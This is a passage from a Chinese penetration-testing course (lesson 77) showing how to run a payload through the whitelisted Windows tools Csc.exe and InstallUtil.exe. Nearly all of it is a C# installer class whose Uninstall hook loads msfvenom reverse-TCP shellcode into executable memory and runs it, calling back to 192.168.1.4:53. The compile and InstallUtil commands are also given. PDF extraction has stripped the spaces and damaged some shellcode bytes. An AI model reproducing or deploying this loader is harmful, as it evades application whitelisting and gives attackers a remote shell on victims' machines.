rpriseServices.dll/r:System.IO.Compression.dll/target:library/out:Mic
opoor.exe/platform:x64/unsafeC:\Users\John\Desktop\Micropoor_Csc.cs
1. C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe/logfile=
/LogToConsole=false/UC:\Users\John\Desktop\Micropoor.exe
与第七十二课相比，payload更为灵活。
1. usingSystem;
2.
3. usingSystem.Net;
4.
5. usingSystem.Diagnostics;
6.
7. usingSystem.Reflection;
8.
9. usingSystem.Configuration.Install;
10.
11. usingSystem.Runtime.InteropServices;
12.
13.
14. //msfvenom‐pwindows/x64/shell/reverse_tcpLHOST=192.168.1.4LPORT=53‐f
csharp
15.
16. publicclassProgram
附录：Micropoor_Csc.cs
第七十七课：基于白名单Csc.exe执行payload第七季
-503-
本文档使用书栈(BookStack.CN)构建
17.
18. {
19.
20. publicstaticvoidMain()
21.
22. {
23.
24. }
25.
26.
27. }
28.
29. [System.ComponentModel.RunInstaller(true)]
30.
31. publicclassSample:System.Configuration.Install.Installer
32.
33. {
34.
35. publicoverridevoidUninstall(System.Collections.IDictionarysavedState)
36.
37. {
38.
39. Shellcode.Exec();
40.
41. }
42.
43. }
44.
45. publicclassShellcode
46.
47. {
48.
49. publicstaticvoidExec()
50.
51. {
52.
53. byte[]shellcode=newbyte[510]{
54.
55. 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
56.
57. 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,x48,
58.
第七十七课：基于白名单Csc.exe执行payload第七季
-504-
本文档使用书栈(BookStack.CN)构建
59. 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,xc9,
60.
61. 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,x41,
62.
63. 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,x48,
64.
65. 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,x8b,
66.
67. 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,x8b,
68.
69. 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,x41,
70.
71. 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,xc1,
72.
73. 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,x45,
74.
75. 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,x8b,
76.
77. 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,x01,
78.
79. 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,x48,
80.
81. 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,xe9,
82.
83. 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,x00,
84.
85. 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,xe5,
86.
87. 0x49,0xbc,0x02,0x00,0x00,0x35,0xc0,0xa8,0x01,0x04,0x41,0x54,0x49,0x89,xe4,
88.
89. 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,x68,
90.
91. 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,x0a,
92.
93. 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,x89,
94.
95. 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,xd5,
96.
97. 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,xba,
98.
99. 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,xe5,
100.
第七十七课：基于白名单Csc.exe执行payload第七季
-505-
本文档使用书栈(BookStack.CN)构建
101. 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,xc9,
102.
103. 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,xd5,
104.
105. 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,x41,
106.
107. 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,x41,
108.
109. 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,x31,
110.
111. 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,xc8,
112.
113. 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,x40,
114.
115. 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,xd5,
116.
117. 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,x3c,
118.
119. 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,x41,
120.
121. 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,xd5};
122.
123.
124. UInt32funcAddr=VirtualAlloc(0,(UInt32)shellcode.Length,
125.
126. MEM_COMMIT,PAGE_EXECUTE_READWRITE);
127.
128. Marshal.Copy(shellcode,0,(IntPtr)(funcAddr),shellcode.Length);
129.
130. IntPtrhThread=IntPtr.Zero;
131.
132. UInt32threadId=0;
133.
134. IntPtrpinfo=IntPtr.Zero;
135.
136. hThread=CreateThread(0,0,funcAddr,pinfo,0,refthreadId);
137.
138. WaitForSingleObject(hThread,0xFFFFFFFF);
139.
140. }
141.
142. privatestaticUInt32MEM_COMMIT=0x1000;
第七十七课：基于白名单Csc.exe执行payload第七季
-506-
本文档使用书栈(BookStack.CN)构建
143.
144. privatestaticUInt32PAGE_EXECUTE_READWRITE=0x40;
145.
146. [DllImport("kernel32")]
147.
148. privatestaticexternUInt32VirtualAlloc(UInt32lpStartAddr,UInt32size,
UInt32flAllocationType,UInt32flProtect);
149.
150. [DllImport("kernel32")]
151.
152. privatestaticexternboolVirtualFree(IntPtrlpAddress,
153.
154. UInt32dwSize,UInt32dwFreeType);
155.
156. [DllImport("kernel32")]
157.
158. privatestaticexternIntPtrCreateThread(
159.
160. UInt32lpThreadAttributes,
161.
162. UInt32dwStackSize,
163.
164. UInt32lpStartAddress,
165.
166. IntPtrparam,
167.
168. UInt32dwCreationFlags,
169.
170. refUInt32lpThreadId
171.
172. );
173.
174. [DllImport("kernel32")]
175.
176. privatestaticexternboolCloseHandle(IntPtrhandle);
177.
178. [DllImport("kernel32")]
179.
180. privatestaticexternUInt32WaitForSingleObject(
181.
182. IntPtrhHandle,
183.
第七十七课：基于白名单Csc.exe执行payload第七季
-507-
本文档使用书栈(BookStack.CN)构建
184. UInt32dwMilliseconds
185.
186. );
187.
188. [DllImport("kernel32")]
189.
190. privatestaticexternIntPtrGetModuleHandle(
191.
192. stringmoduleName
193.
194. );
195.
196. [DllImport("kernel32")]
197.
198. privatestaticexternUInt32GetProcAddress(
199.
200. IntPtrhModule,
201.
202. stringprocName
203.
204. );
205.
206. [DllImport("kernel32")]
207.
208. privatestaticexternUInt32LoadLibrary(
209.
210. stringlpFileName
211.
212. );
213.
214. [DllImport("kernel32")]
215.
216. privatestaticexternUInt32GetLastError();
217.
218. }
Micropoor
第七十七课：基于白名单Csc.exe执行payload第七季
-508-